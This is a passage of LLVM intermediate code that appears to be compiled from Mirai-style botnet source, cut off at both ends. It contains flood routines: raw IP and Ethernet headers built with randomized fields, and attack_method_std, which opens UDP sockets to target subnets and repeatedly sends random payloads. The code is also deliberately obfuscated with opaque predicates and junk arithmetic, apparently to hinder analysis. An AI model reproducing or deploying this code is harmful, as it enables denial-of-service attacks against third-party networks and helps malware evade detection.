  %gen57 = add i8 %_56, 5
  %_58 = sub i8 %923, 5
  %gen59 = mul i8 %_58, 5
  %_60 = shl i8 %923, 5
  %_61 = shl i8 %923, 5
  %924 = or i8 %923, 5
  store i8 %924, i8* %921, align 4
  %925 = load i8, i8* %20, align 1
  %926 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %927 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %926, i32 0, i32 1
  store i8 %925, i8* %927, align 1
  %928 = load i32, i32* %26, align 4
  %929 = sext i32 %928 to i64
  %_62 = shl i64 28, %929
  %_63 = shl i64 28, %929
  %_64 = sub i64 0, 28
  %gen65 = add i64 %_64, %929
  %_66 = sub i64 28, %929
  %gen67 = mul i64 %_66, %929
  %_68 = shl i64 28, %929
  %_69 = sub i64 28, %929
  %gen70 = mul i64 %_69, %929
  %_71 = sub i64 28, %929
  %gen72 = mul i64 %_71, %929
  %930 = add i64 28, %929
  %931 = trunc i64 %930 to i16
  %932 = call zeroext i16 @htons(i16 zeroext %931) #7
  %933 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %934 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %933, i32 0, i32 2
  store i16 %932, i16* %934, align 2
  %935 = load i16, i16* %21, align 2
  %936 = zext i16 %935 to i32
  %_73 = shl i32 %936, -1
  %_74 = sub i32 %936, -1
  %gen75 = mul i32 %_74, -1
  %_76 = sub i32 0, %936
  %gen77 = add i32 %_76, -1
  %937 = xor i32 %936, -1
  %938 = trunc i32 %937 to i16
  %939 = call zeroext i16 @htons(i16 zeroext %938) #7
  %940 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %941 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %940, i32 0, i32 3
  store i16 %939, i16* %941, align 4
  %942 = load i8, i8* %22, align 1
  %943 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %944 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %943, i32 0, i32 5
  store i8 %942, i8* %944, align 4
  %945 = load i8, i8* %23, align 1
  %946 = icmp ne i8 %945, 0
  br label %originalBB43

originalBB81alteredBB:                            ; preds = %originalBB81, %274
  %947 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %948 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %949 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %948, i32 0, i32 4
  store i16 %947, i16* %949, align 2
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %332
  %950 = load i32, i32* %17, align 4
  %_86 = shl i32 %950, 1
  %_87 = sub i32 %950, 1
  %gen88 = mul i32 %_87, 1
  %_89 = sub i32 %950, 1
  %gen90 = mul i32 %_89, 1
  %_91 = shl i32 %950, 1
  %_92 = sub i32 0, %950
  %gen93 = add i32 %_92, 1
  %951 = add nsw i32 %950, 1
  store i32 %951, i32* %17, align 4
  br label %originalBB85

originalBB97alteredBB:                            ; preds = %originalBB97, %352
  store i32 0, i32* %17, align 4
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %405
  %952 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %953 = load i32, i32* %17, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %952, i64 %954
  %956 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %955, i32 0, i32 1
  %957 = load i32, i32* %956, align 4
  %958 = call i32 @ntohl(i32 %957) #7
  %959 = call i32 @rand_next()
  %960 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %961 = load i32, i32* %17, align 4
  %962 = sext i32 %961 to i64
  %963 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %960, i64 %962
  %964 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %963, i32 0, i32 2
  %965 = load i8, i8* %964, align 4
  %966 = zext i8 %965 to i32
  %_102 = shl i32 %959, %966
  %_103 = shl i32 %959, %966
  %967 = lshr i32 %959, %966
  %_104 = sub i32 %958, %967
  %gen105 = mul i32 %_104, %967
  %_106 = shl i32 %958, %967
  %_107 = sub i32 0, %958
  %gen108 = add i32 %_107, %967
  %_109 = sub i32 0, %958
  %gen110 = add i32 %_109, %967
  %968 = add i32 %958, %967
  %969 = call i32 @htonl(i32 %968) #7
  %970 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %971 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %970, i32 0, i32 9
  store i32 %969, i32* %971, align 4
  br label %originalBB101

originalBB114alteredBB:                           ; preds = %originalBB114, %442
  %972 = load i32, i32* %29, align 4
  %973 = icmp eq i32 %972, -1
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %461
  %974 = call i32 @rand_next()
  %975 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %976 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %975, i32 0, i32 8
  store i32 %974, i32* %976, align 4
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %481
  %977 = load i16, i16* %21, align 2
  %978 = zext i16 %977 to i32
  %979 = icmp eq i32 %978, 65535
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %501
  %980 = call i32 @rand_next()
  %_127 = sub i32 %980, 65535
  %gen128 = mul i32 %_127, 65535
  %_129 = shl i32 %980, 65535
  %_130 = shl i32 %980, 65535
  %_131 = shl i32 %980, 65535
  %_132 = shl i32 %980, 65535
  %_133 = sub i32 %980, 65535
  %gen134 = mul i32 %_133, 65535
  %_135 = shl i32 %980, 65535
  %981 = and i32 %980, 65535
  %982 = trunc i32 %981 to i16
  %983 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %984 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %983, i32 0, i32 3
  store i16 %982, i16* %984, align 4
  %985 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %986 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %985, i32 0, i32 3
  %987 = load i16, i16* %986, align 4
  %988 = zext i16 %987 to i32
  %_136 = sub i32 %988, 1000
  %gen137 = mul i32 %_136, 1000
  %_138 = sub i32 %988, 1000
  %gen139 = mul i32 %_138, 1000
  %_140 = sub i32 0, %988
  %gen141 = add i32 %_140, 1000
  %989 = sub nsw i32 %988, 1000
  %_142 = sub i32 %989, -1
  %gen143 = mul i32 %_142, -1
  %_144 = sub i32 %989, -1
  %gen145 = mul i32 %_144, -1
  %_146 = sub i32 0, %989
  %gen147 = add i32 %_146, -1
  %990 = xor i32 %989, -1
  %991 = trunc i32 %990 to i16
  %992 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %993 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %992, i32 0, i32 3
  store i16 %991, i16* %993, align 4
  br label %originalBB126

originalBB151alteredBB:                           ; preds = %originalBB151, %542
  %994 = load i16, i16* %25, align 2
  %995 = zext i16 %994 to i32
  %996 = icmp eq i32 %995, 65535
  br label %originalBB151

originalBB155alteredBB:                           ; preds = %originalBB155, %571
  %997 = call i32 @rand_next()
  %998 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %999 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %998, i32 0, i32 9
  store i32 %997, i32* %999, align 4
  br label %originalBB155

originalBB159alteredBB:                           ; preds = %originalBB159, %597
  %1000 = call i32 @rand_next()
  store i32 %1000, i32* %45, align 4
  %1001 = call i32 @rand_next()
  store i32 %1001, i32* %46, align 4
  %1002 = call i32 @rand_next()
  store i32 %1002, i32* %47, align 4
  %1003 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %1004 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %1003, i32 0, i32 0
  %1005 = getelementptr inbounds [6 x i8], [6 x i8]* %1004, i32 0, i32 0
  %1006 = bitcast i32* %45 to i8*
  call void @util_memcpy(i8* %1005, i8* %1006, i32 4)
  %1007 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %1008 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %1007, i32 0, i32 1
  %1009 = getelementptr inbounds [6 x i8], [6 x i8]* %1008, i32 0, i32 0
  %1010 = bitcast i32* %46 to i8*
  call void @util_memcpy(i8* %1009, i8* %1010, i32 4)
  %1011 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %1012 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %1011, i32 0, i32 0
  %1013 = getelementptr inbounds [6 x i8], [6 x i8]* %1012, i32 0, i32 0
  %1014 = getelementptr inbounds i8, i8* %1013, i64 4
  %1015 = bitcast i32* %47 to i8*
  call void @util_memcpy(i8* %1014, i8* %1015, i32 2)
  %1016 = load %struct.ethhdr*, %struct.ethhdr** %41, align 8
  %1017 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %1016, i32 0, i32 1
  %1018 = getelementptr inbounds [6 x i8], [6 x i8]* %1017, i32 0, i32 0
  %1019 = getelementptr inbounds i8, i8* %1018, i64 4
  %1020 = bitcast i32* %47 to i8*
  %1021 = getelementptr inbounds i8, i8* %1020, i64 2
  call void @util_memcpy(i8* %1019, i8* %1021, i32 2)
  %1022 = load i8, i8* %27, align 1
  %1023 = icmp ne i8 %1022, 0
  br label %originalBB159

originalBB163alteredBB:                           ; preds = %originalBB163, %638
  %1024 = load i8*, i8** %44, align 8
  %1025 = load i32, i32* %26, align 4
  call void @rand_str(i8* %1024, i32 %1025)
  br label %originalBB163

originalBB167alteredBB:                           ; preds = %originalBB167, %724
  %1026 = load i32, i32* %17, align 4
  %_168 = sub i32 0, %1026
  %gen169 = add i32 %_168, 1
  %_170 = sub i32 %1026, 1
  %gen171 = mul i32 %_170, 1
  %_172 = sub i32 0, %1026
  %gen173 = add i32 %_172, 1
  %1027 = add nsw i32 %1026, 1
  store i32 %1027, i32* %17, align 4
  br label %originalBB167

originalBB177alteredBB:                           ; preds = %originalBB177, %744
  br label %originalBB177
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %70

; <label>:51:                                     ; preds = %4
  %52 = load i32, i32* @x.23
  %53 = load i32, i32* @y.24
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %51
  %60 = call i32 @rand_next()
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %13, align 2
  %62 = load i32, i32* @x.23
  %63 = load i32, i32* @y.24
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %89

; <label>:70:                                     ; preds = %4
  %71 = load i32, i32* @x.23
  %72 = load i32, i32* @y.24
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = load i16, i16* %13, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %79) #7
  store i16 %80, i16* %13, align 2
  %81 = load i32, i32* @x.23
  %82 = load i32, i32* @y.24
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %89

; <label>:89:                                     ; preds = %originalBBpart24, %originalBBpart2
  %90 = load i32, i32* @x.23
  %91 = load i32, i32* @y.24
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %89
  store i32 0, i32* %9, align 4
  %98 = load i32, i32* @x.23
  %99 = load i32, i32* @y.24
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %106

; <label>:106:                                    ; preds = %originalBBpart232, %originalBBpart28
  %107 = load i32, i32* %9, align 4
  %108 = load i8, i8* %5, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %301

; <label>:111:                                    ; preds = %106
  %112 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %113 = load i8**, i8*** %10, align 8
  %114 = load i32, i32* %9, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8*, i8** %113, i64 %115
  store i8* %112, i8** %116, align 8
  %117 = load i16, i16* %12, align 2
  %118 = zext i16 %117 to i32
  %119 = icmp eq i32 %118, 65535
  br i1 %119, label %120, label %129

; <label>:120:                                    ; preds = %111
  %121 = call i32 @rand_next()
  %122 = trunc i32 %121 to i16
  %123 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %124 = load i32, i32* %9, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %123, i64 %125
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i32 0, i32 0
  %128 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %127, i32 0, i32 1
  store i16 %122, i16* %128, align 2
  br label %154

; <label>:129:                                    ; preds = %111
  %130 = load i32, i32* @x.23
  %131 = load i32, i32* @y.24
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %129
  %138 = load i16, i16* %12, align 2
  %139 = call zeroext i16 @htons(i16 zeroext %138) #7
  %140 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 0
  %145 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %144, i32 0, i32 1
  store i16 %139, i16* %145, align 2
  %146 = load i32, i32* @x.23
  %147 = load i32, i32* @y.24
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %154

; <label>:154:                                    ; preds = %originalBBpart212, %120
  %155 = load i32, i32* @x.23
  %156 = load i32, i32* @y.24
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %154
  %163 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %164 = load i32*, i32** %11, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds i32, i32* %164, i64 %166
  store i32 %163, i32* %167, align 4
  %168 = icmp eq i32 %163, -1
  %169 = load i32, i32* @x.23
  %170 = load i32, i32* @y.24
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %168, label %177, label %194

; <label>:177:                                    ; preds = %originalBBpart216
  %178 = load i32, i32* @x.23
  %179 = load i32, i32* @y.24
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %177
  %186 = load i32, i32* @x.23
  %187 = load i32, i32* @y.24
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  ret void

; <label>:194:                                    ; preds = %originalBBpart216
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %195, align 4
  %196 = load i16, i16* %13, align 2
  %197 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %196, i16* %197, align 2
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %199 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %198, i32 0, i32 0
  store i32 0, i32* %199, align 4
  %200 = load i32*, i32** %11, align 8
  %201 = load i32, i32* %9, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds i32, i32* %200, i64 %202
  %204 = load i32, i32* %203, align 4
  %205 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %206 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %206, %struct.sockaddr** %205, align 8
  %207 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %208 = load %struct.sockaddr*, %struct.sockaddr** %207, align 8
  %209 = call i32 @bind(i32 %204, %struct.sockaddr* %208, i32 16) #6
  %210 = icmp eq i32 %209, -1
  br i1 %210, label %211, label %212

; <label>:211:                                    ; preds = %194
  br label %212

; <label>:212:                                    ; preds = %211, %194
  %213 = load i32, i32* @x.23
  %214 = load i32, i32* @y.24
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %212
  %221 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %222 = load i32, i32* %9, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %221, i64 %223
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %224, i32 0, i32 2
  %226 = load i8, i8* %225, align 4
  %227 = zext i8 %226 to i32
  %228 = icmp slt i32 %227, 32
  %229 = load i32, i32* @x.23
  %230 = load i32, i32* @y.24
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %228, label %237, label %263

; <label>:237:                                    ; preds = %originalBBpart224
  %238 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %239 = load i32, i32* %9, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %241, i32 0, i32 1
  %243 = load i32, i32* %242, align 4
  %244 = call i32 @ntohl(i32 %243) #7
  %245 = call i32 @rand_next()
  %246 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %247 = load i32, i32* %9, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %246, i64 %248
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %249, i32 0, i32 2
  %251 = load i8, i8* %250, align 4
  %252 = zext i8 %251 to i32
  %253 = lshr i32 %245, %252
  %254 = add i32 %244, %253
  %255 = call i32 @htonl(i32 %254) #7
  %256 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i32 0, i32 0
  %261 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %260, i32 0, i32 2
  %262 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %261, i32 0, i32 0
  store i32 %255, i32* %262, align 4
  br label %263

; <label>:263:                                    ; preds = %237, %originalBBpart224
  %264 = load i32*, i32** %11, align 8
  %265 = load i32, i32* %9, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds i32, i32* %264, i64 %266
  %268 = load i32, i32* %267, align 4
  %269 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %270 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %270, i64 %272
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %273, i32 0, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  store %struct.sockaddr* %275, %struct.sockaddr** %269, align 8
  %276 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %277 = load %struct.sockaddr*, %struct.sockaddr** %276, align 8
  %278 = call i32 @connect(i32 %268, %struct.sockaddr* %277, i32 16)
  %279 = icmp eq i32 %278, -1
  br i1 %279, label %280, label %281

; <label>:280:                                    ; preds = %263
  br label %281

; <label>:281:                                    ; preds = %280, %263
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* @x.23
  %284 = load i32, i32* @y.24
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %282
  %291 = load i32, i32* %9, align 4
  %292 = add nsw i32 %291, 1
  store i32 %292, i32* %9, align 4
  %293 = load i32, i32* @x.23
  %294 = load i32, i32* @y.24
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBBpart232, label %originalBB26alteredBB

originalBBpart232:                                ; preds = %originalBB26
  br label %106

; <label>:301:                                    ; preds = %106
  br label %302

; <label>:302:                                    ; preds = %originalBBpart248, %301
  store i32 0, i32* %9, align 4
  br label %303

; <label>:303:                                    ; preds = %378, %302
  %304 = load i32, i32* @x.23
  %305 = load i32, i32* @y.24
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %303
  %312 = load i32, i32* %9, align 4
  %313 = load i8, i8* %5, align 1
  %314 = zext i8 %313 to i32
  %315 = icmp slt i32 %312, %314
  %316 = load i32, i32* @x.23
  %317 = load i32, i32* @y.24
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %315, label %324, label %381

; <label>:324:                                    ; preds = %originalBBpart236
  %325 = load i32, i32* @x.23
  %326 = load i32, i32* @y.24
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %324
  %333 = load i8**, i8*** %10, align 8
  %334 = load i32, i32* %9, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds i8*, i8** %333, i64 %335
  %337 = load i8*, i8** %336, align 8
  store i8* %337, i8** %22, align 8
  %338 = load i8, i8* %15, align 1
  %339 = icmp ne i8 %338, 0
  %340 = load i32, i32* @x.23
  %341 = load i32, i32* @y.24
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %339, label %348, label %352

; <label>:348:                                    ; preds = %originalBBpart240
  %349 = load i8*, i8** %22, align 8
  %350 = load i16, i16* %14, align 2
  %351 = zext i16 %350 to i32
  call void @rand_str(i8* %349, i32 %351)
  br label %352

; <label>:352:                                    ; preds = %348, %originalBBpart240
  %353 = load i32, i32* @x.23
  %354 = load i32, i32* @y.24
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %352
  %361 = load i32*, i32** %11, align 8
  %362 = load i32, i32* %9, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds i32, i32* %361, i64 %363
  %365 = load i32, i32* %364, align 4
  %366 = load i8*, i8** %22, align 8
  %367 = load i16, i16* %14, align 2
  %368 = zext i16 %367 to i64
  %369 = call i64 @send(i32 %365, i8* %366, i64 %368, i32 16384)
  %370 = load i32, i32* @x.23
  %371 = load i32, i32* @y.24
  %372 = sub i32 %370, 1
